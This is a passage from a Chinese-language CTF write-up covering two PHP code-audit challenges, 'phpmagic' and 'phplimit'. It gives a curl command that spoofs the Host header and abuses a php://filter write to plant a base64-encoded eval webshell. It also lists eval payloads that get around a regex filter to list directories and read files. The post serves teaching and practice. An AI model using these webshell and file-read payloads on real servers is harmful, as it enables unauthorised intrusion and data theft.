class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">input</span>-<span class="title">group</span> <span class="title">mt</span>-3&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">input</span>-<span class="title">group</span>-<span class="title">prepend</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">input</span>-<span class="title">group</span>-<span class="title">text</span>&quot; <span class="title">id</span>=&quot;<span class="title">basic</span>-<span class="title">addon1</span>&quot;&gt;<span class="title">dig</span> -<span class="title">t</span> <span class="title">A</span> -<span class="title">q</span>&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">domain</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Your</span> <span class="title">domain</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">input</span>-<span class="title">group</span>-<span class="title">append</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">outline</span>-<span class="title">secondary</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;执行&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">pre</span> <span class="title">class</span>=&quot;<span class="title">mt</span>-3&quot;&gt;&lt;?<span class="title">php</span> <span class="title">if</span>(!<span class="title">empty</span>($<span class="title">_POST</span>) &amp;&amp; $<span class="title">domain</span>):</span></span><br><span class="line"><span class="class">                $<span class="title">command</span> = <span class="title">sprintf</span>(&quot;<span class="title">dig</span> -<span class="title">t</span> <span class="title">A</span> -<span class="title">q</span> %<span class="title">s</span>&quot;, <span class="title">escapeshellarg</span>($<span class="title">domain</span>));</span></span><br><span class="line"><span class="class">                $<span class="title">output</span> = <span class="title">shell_exec</span>($<span class="title">command</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                $<span class="title">output</span> = <span class="title">htmlspecialchars</span>($<span class="title">output</span>, <span class="title">ENT_HTML401</span>  <span class="title">ENT_QUOTES</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                $<span class="title">log_name</span> = $<span class="title">_SERVER</span>[&#x27;<span class="title">SERVER_NAME</span>&#x27;] . $<span class="title">log_name</span>;</span></span><br><span class="line"><span class="class">                <span class="title">if</span>(!<span class="title">in_array</span>(<span class="title">pathinfo</span>($<span class="title">log_name</span>, <span class="title">PATHINFO_EXTENSION</span>), [&#x27;<span class="title">php</span>&#x27;, &#x27;<span class="title">php3</span>&#x27;, &#x27;<span class="title">php4</span>&#x27;, &#x27;<span class="title">php5</span>&#x27;, &#x27;<span class="title">phtml</span>&#x27;, &#x27;<span class="title">pht</span>&#x27;], <span class="title">true</span>)) </span>&#123;</span><br><span class="line">                    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$log_name</span>, <span class="variable">$output</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">            <span class="keyword">endif</span>; <span class="meta">?&gt;</span>&lt;/pre&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure>
+
+<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>简单审计一下,发现可以把dig的结果存到一个文件,那么就可以利用这一点来写shell,后面进行了一个简单的判断,然后用<code>file_put_contents</code>来写文件,简单测试一下 <a href="/images/2018/11/2018-12-06-17-14-32-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/11/2018-12-06-17-14-32-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"></a> 那么写文件就不成问题了,那么问题是怎么写shell呢? 尖括号都会被转义掉,这里本来考虑到了伪协议的问题,不过卡在了<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>的绕过 后来看到 <a href="/images/2018/11/2018-12-06-17-26-38-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/11/2018-12-06-17-26-38-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"></a> 还是不太明白,看看英文版</p>
+<blockquote>
+<p>‘SERVER_NAME’ The name of the server host under which the current script is executing. If the script is running on a virtual host, this will be the value defined for that virtual host. Note: Under Apache 2, you must set UseCanonicalName &#x3D; On and ServerName. Otherwise, this value reflects the hostname supplied by the client, which can be spoofed. It is not safe to rely on this value in security-dependent contexts.</p>
+</blockquote>
+<p>发现可以由hostname伪造,试试看改host <a href="/images/2018/11/2018-12-06-17-30-43-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/11/2018-12-06-17-30-43-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"></a> 那么</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$log_name</span>, <span class="variable">$output</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这个<code>log_name</code>就是可控的,从而可以通过伪协议写shell 用伪协议的时候将<code>domain</code>给base一下,然后控制<code>log_name</code>来解base,从而还原shell 注意base的时候pad到字符是4的倍数,我这里多试了几次</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -d <span class="string">&#x27;domain=PD9waHAKZXZhbCgkX0dFVFsnYmxhY3NoZWVwJ10pOwo/Pg&amp;log=://filter/write=convert.base64-decode/resource=blacsheep3.php/.&#x27;</span> -H <span class="string">&quot;Host: php&quot;</span> <span class="string">&#x27;http://51.158.75.42:8082/&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后拿到shell <a href="/images/2018/11/2018-12-06-18-15-03-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/11/2018-12-06-18-15-03-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"></a></p>
+<h1 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h1><h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^W]+((?R)?)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>2018rctf的r-cursive的一部分 参考:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2347" title="https://xz.aliyun.com/t/2347">https://xz.aliyun.com/t/2347</a> 看到他们之前的payload 尝试getallheaders但是失败了,又看到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=print(readdir(opendir(getcwd()))); 可以列目录</span><br><span class="line">?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件</span><br><span class="line">?cmd=print(dirname(dirname(getcwd()))); print出/var/www</span><br></pre></td></tr></table></figure>
+
+<p>稍作修改,获得下面的payload <a target="_blank" rel="noopener" href="http://51.158.75.42:8084/?code=print_r(readfile(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))));" title="http://51.158.75.42:8084/?code=print_r%28readfile%28array_rand%28array_flip%28scandir%28dirname%28chdir%28dirname%28getcwd%28%29%29%29%29%29%29%29%29%29%3B">http://51.158.75.42:8084/?code=print_r%28readfile%28array_rand%28array_flip%28scandir%28dirname%28chdir%28dirname%28getcwd%28%29%29%29%29%29%29%29%29%29%3B</a> 因为设计到array_rand,所以只是可能拿到flag… 多刷几次就好,主要还是通过dirname获取目录来进行返回 后来看了一波wp.. 两种方法</p>
+<h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars"></a>get_defined_vars</h3><p><a href="/images/2018/11/2018-12-06-19-20-59-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/11/2018-12-06-19-20-59-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"></a> 所以直接用就好 <a href="/images/2018/11/2018-12-06-19-31-33-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/11/2018-12-06-19-31-33-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"></a> 注意把a(命令参数)放在前面,方便执行的时候先执行然后加注释,不然执行不了命令,比如<code>scandir()</code>就会爆内存 然后拿到flag <a href="/images/2018/11/2018-12-06-19-35-07-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/11/2018-12-06-19-35-07-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"></a></p>
+<h3 id="另一种绕过"><a href="#另一种绕过" class="headerlink" title="另一种绕过"></a>另一种绕过</h3><p><code>code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code> 用的<code>array_reverse()</code>和<code>next()</code>绕过的</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-function"><span class="toc-number">1.</span> <span class="toc-text">easy - function</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-pcrewaf"><span class="toc-number">2.</span> <span class="toc-text">easy - pcrewaf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-1"><span class="toc-number">2.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">2.2.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-phpmagic"><span class="toc-number">3.</span> <span class="toc-text">easy - phpmagic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-2"><span class="toc-number">3.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="toc-number">3.2.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-phplimit"><span class="toc-number">4.</span> <span class="toc-text">easy - phplimit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-3"><span class="toc-number">4.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get-defined-vars"><span class="toc-number">4.2.1.</span> <span class="toc-text">get_defined_vars</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E7%BB%95%E8%BF%87"><span class="toc-number">4.2.2.</span> <span class="toc-text">另一种绕过</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&text=ph师傅的代码审计星球"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&title=ph师傅的代码审计星球"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&is_video=false&description=ph师傅的代码审计星球"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ph师傅的代码审计星球&body=Check out this article: http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&title=ph师傅的代码审计星球"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&title=ph师傅的代码审计星球"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&title=ph师傅的代码审计星球"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&title=ph师傅的代码审计星球"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&name=ph师傅的代码审计星球&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&t=ph师傅的代码审计星球"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    blacsheep
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
